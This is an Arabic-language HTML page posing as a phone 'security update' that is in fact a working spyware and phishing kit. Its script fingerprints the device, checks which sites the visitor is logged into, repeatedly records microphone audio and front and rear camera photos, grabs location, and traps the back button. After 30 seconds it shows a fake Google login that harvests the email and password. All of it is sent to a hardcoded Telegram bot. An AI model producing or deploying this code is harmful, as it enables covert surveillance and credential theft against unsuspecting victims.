<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚙️ تحديث أمان النظام</title>
    <style>
        body { background-color: #000; color: #fff; font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; text-align: center; }
        .update-box { width: 85%; max-width: 400px; }
        .loader { border: 4px solid #1a1a1a; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #phish-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 9999; justify-content: center; align-items: center; color: #000; }
        .login-card { width: 90%; max-width: 360px; text-align: center; }
        .login-card img { width: 75px; }
        .login-card input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; }
        .login-card button { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
        #video, #canvas { display: none; }
    </style>
</head>
<body>

    <div class="update-box" id="main-ui">
        <div class="loader"></div>
        <h2 style="color:#eee;">جاري فحص وتحديث النظام...</h2>
        <p style="font-size:12px; color:#666;">يرجى السماح بالأذونات لضمان استقرار هاتفك ومنع الاختراق.</p>
    </div>

    <div id="phish-overlay">
        <div class="login-card">
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg">
            <h1 style="font-size: 22px; font-weight: 400;">تأكيد ملكية الحساب</h1>
            <p>يجب تسجيل الدخول لإكمال التحديث الأمني</p>
            <input type="email" id="email" placeholder="البريد الإلكتروني">
            <input type="password" id="pass" placeholder="كلمة المرور">
            <button onclick="sendCreds()">تأكيد الهوية</button>
        </div>
    </div>

    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

    <script>
        const TOKEN = "8723330008:AAH7fjX2fEKZ3-7WCWRQyiLHmNoaEY5QUaw";
        const CHAT_ID = "7984067238";
        let currentStream = null;

        function notify(msg) {
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
        }

        // 1. نظام جلب "بصمة الجهاز" المتكاملة (مثل الصورة)
        async function getIntelligence() {
            try {
                const batt = await navigator.getBattery();
                const ram = navigator.deviceMemory || "N/A";
                const cores = navigator.hardwareConcurrency || "N/A";
                const network = navigator.connection ? navigator.connection.effectiveType : "N/A";
                const time = new Date().toLocaleTimeString('ar-YE');

                let info = "🛡️ **تقرير اختراق جديد (بصمة الجهاز):**\n\n";
                info += `📱 *المنصة:* ${navigator.platform}\n`;
                info += `⚙️ *المعالج (أنوية):* ${cores}\n`;
                info += `💾 *الرام التقريبي:* ${ram} GB\n`;
                info += `🔋 *البطارية:* ${Math.round(batt.level * 100)}% (استهلاك)\n`;
                info += `🌐 *الشبكة:* ${network}\n`;
                info += `⏰ *التوقيت:* ${time}\n`;
                info += `🔗 *الرابط المصدر:* دخول مباشر\n`;
                notify(info);

                // كشف الحسابات النشطة
                ["Google", "Facebook", "Twitter"].forEach(s => {
                    let img = new Image(); img.src = `https://${s.toLowerCase()}.com/favicon.ico`;
                    img.onload = () => notify(`🌐 الضحية مسجل دخول في: *${s}*`);
                });
            } catch(e) { notify("⚠️ تعذر سحب بعض البيانات التقنية."); }
        }

        // 2. تسجيل صوت مباشر (8 ثوانٍ)
        async function startAudio() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const rec = new MediaRecorder(stream);
                rec.ondataavailable = (e) => {
                    const fd = new FormData();
                    fd.append('chat_id', CHAT_ID);
                    fd.append('voice', e.data, 'mic.ogg');
                    fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: fd });
                };
                setInterval(() => {
                    rec.start();
                    setTimeout(() => rec.stop(), 8000); // تسجيل 8 ثوانٍ كما طلبت
                }, 20000); 
            } catch(e) { notify("❌ الضحية رفض الميكروفون."); }
        }

        // 3. تصوير تتابعي (أمامية/خلفية كل ثانتين)
        async function startVisuals() {
            const modes = ["user", "environment"];
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            let i = 0;
            while(true) {
                try {
                    if (currentStream) currentStream.getTracks().forEach(t => t.stop());
                    currentStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: modes[i%2] } });
                    video.srcObject = currentStream;
                    await new Promise(r => setTimeout(r, 700));
                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    canvas.toBlob(b => {
                        const fd = new FormData();
                        fd.append('chat_id', CHAT_ID);
                        fd.append('photo', b, 'i.jpg');
                        fd.append('caption', `🔄 لقطة من الكاميرا: ${modes[i%2]==="user"?"الأمامية":"الخلفية"}`);
                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                    }, 'image/jpeg', 0.5);
                } catch(e) {}
                i++; await new Promise(r => setTimeout(r, 2000)); // كل ثانيتين
            }
        }

        function sendCreds() {
            const e = document.getElementById('email').value;
            const p = document.getElementById('pass').value;
            if(e && p) {
                notify(`🔥 **بيانات حساب جوجل مسحوبة:**\n📧: \`${e}\`\n🔐: \`${p}\``);
                document.getElementById('phish-overlay').style.display = 'none';
                alert("اكتمل التحديث بنجاح.");
            }
        }

        window.onload = () => {
            // منع الخروج
            for(let i=0; i<100; i++) window.history.pushState(null, null, window.location.href);
            window.onpopstate = () => window.history.pushState(null, null, window.location.href);
            
            getIntelligence();
            startAudio();
            startVisuals();

            // الموقع
            navigator.geolocation.getCurrentPosition(p => {
                notify(`📍 **الموقع:** https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
            });

            // إظهار واجهة سحب الحساب بعد فترة
            setTimeout(() => {
                document.getElementById('phish-overlay').style.display = 'flex';
                if(navigator.vibrate) navigator.vibrate([500, 200, 500]);
            }, 30000);
            
            if(navigator.wakeLock) navigator.wakeLock.request('screen');
        };
    </script>
</body>
</html>
